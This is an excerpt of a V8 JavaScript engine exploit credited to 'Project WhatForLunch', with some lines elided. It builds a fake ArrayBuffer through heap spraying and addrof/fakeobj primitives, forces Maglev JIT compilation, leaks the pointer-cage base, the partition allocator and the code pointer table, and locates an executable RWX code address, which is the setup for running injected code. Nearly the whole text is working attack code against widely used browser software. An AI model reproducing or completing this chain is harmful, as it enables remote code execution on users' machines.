...
//d8.file.execute('/root/zpool_git/v8latest/v8/test/mjsunit/wasm/wasm-module-builder.js');

print("[*] Exploit by Project WhatForLunch");
...
const backing_len = 0x100000; 
const backing_packed_double_map = 0x939n;
const backing_normal_map = 0x7e5n;
//update these and the spray if stuff breaks
const packed_double_map = 0x100d0f1n;
const packed_map = 0x0100d179n;
const arraybuffer_map = 0x01010e91n
const backing_elems_base = 0x01600011n;

const backing = new Array(backing_len).fill(itof(0x1337133713371337n));

//fake arraybuffer

backing[0x10] = itof((backing_normal_map << 32n) | arraybuffer_map);
backing[0x11] = itof(backing_normal_map);
...
const cage_base = addrof({}) & 0xffffffff_00000000n

print("[+] cage base: " + hex(cage_base))


const arbwrite_arraybuf = fakeobj(cage_base + backing_elems_base + 0x88n);
...
jitme();
%OptimizeMaglevOnNextCall(jitme);
jitme();



let partition_alloc = read_qword(cage_base + 8n) - 0x8380n - 0x4000n;
print("[+] partition alloc: " + hex(partition_alloc));
let code_ptr_table = read_qword(partition_alloc + 0x0000a5c0n) + 0x20000000n;
print("[+] code ptr table: " + hex(code_ptr_table));
let dispatch_handle = read_qword(addrof(jitme) + 12n - 1n) & 0xffffffffn;
let table_offset = dispatch_handle >> 4n
print("[+] dispatch handle: " + hex(dispatch_handle) + ", table offset: " + hex(table_offset))
let rwx_addr = read_qword(code_ptr_table + table_offset);
